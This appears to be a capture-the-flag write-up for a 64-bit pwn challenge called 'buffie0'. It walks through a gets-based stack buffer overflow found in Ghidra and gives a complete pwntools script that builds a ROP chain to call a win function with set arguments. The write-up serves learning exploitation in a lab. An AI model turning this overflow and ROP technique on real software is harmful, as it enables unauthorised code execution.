# buffie0 Pwn challenge

First of all, with `$file` we see that the binary is a `ELF 64-bit LSB executable`. Let's open `ghidra` to analyze it.  
The `main` function looks like this:  

```c
int main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  welcome();
  vuln();
  goodbye();
  return 0;
}
``` 
As we can easily understand, `vuln` is the function that we have to exploit. Analyzing `vuln`:
```c
void vuln(void)

{
  char buf [100];
  
  puts("Tell me your name friend..");
  gets(buf);
  printf("\nYou think you can pwn me %s!?\n",buf);
  return;
}
```
This is pretty straight forward. There is a `gets` function. That means we can do a **Buffer Overflow**. So, we found the vulnerable part of the code.  
We also see that there is a `win` function in the code.  
```c
void win(longlong arg1,longlong arg2)

{
  FILE *__stream;
  char buf [256];
  FILE *f;
  
  if ((arg1 == 0xdeadbeef) && ((arg2 ^ arg1) == 0xdeadbee6)) {
    puts("Go get \'em champ!\n");
    __stream = fopen("./flag.txt","r");
    if (__stream == (FILE *)0x0) {
      puts("Someone stole the flag! Talk to **w3th4nds**\n");
    }
    else {
      fgets(buf,0x100,__stream);
      printf("Enjoy your flag!\n%s",buf);
    }
    return;
  }
  puts("\n\nYou reached win, but you forgot the args.. Better luck next time :)\n\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
It takes 2 arguments and then there is an `if` which compares if:
* arg1 = 0xdeadbeef
* arg1 ^ arg2 = 0xdeadbee6
and if so, it reads and prints the flag.  

Our goal is:
* Overflow the buffer
* Call `win` with 2 args
* arg1 = 0xdeadbeef and arg2^arg1 = 0xdeadbee6

To get arg2: 0xdeadbeef^0xdeadbee6 = 0x9  
Functions args in 64-bit, got to `rdi`, `rsi`, `rdx` etc.  
So our payload should look like this:  

```sh
payload = junk + pop_rdi + arg1 + pop_rsi + arg2 + fake + win
``` 
I used `pwntools` to exploit it.  

```python
#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr'
port = 2004
filename = './buffie0'

def pwn():
    #r = remote(ip, port)
    r = process(filename)
    elf = ELF(filename)
    rop = ROP(elf)
    win = p64(elf.symbols['win'])
    junk = b'z'*120
    arg1 = p64(0xdeadbeef)
    arg2 = p64(0x9)
    pop_rdi = p64((rop.find_gadget(['pop rdi']))[0]) 
    pop_rsi = p64((rop.find_gadget(['pop rsi']))[0]) 
    fake = p64(0x0)
    payload = junk +  pop_rdi + arg1 + pop_rsi + arg2 + fake + win
    r.sendlineafter('friend..', payload)
    r.recvlines(6)
    flag = r.recvline()
    log.success('Flag: {}'.format(flag.decode('utf8')))
pwn()
```
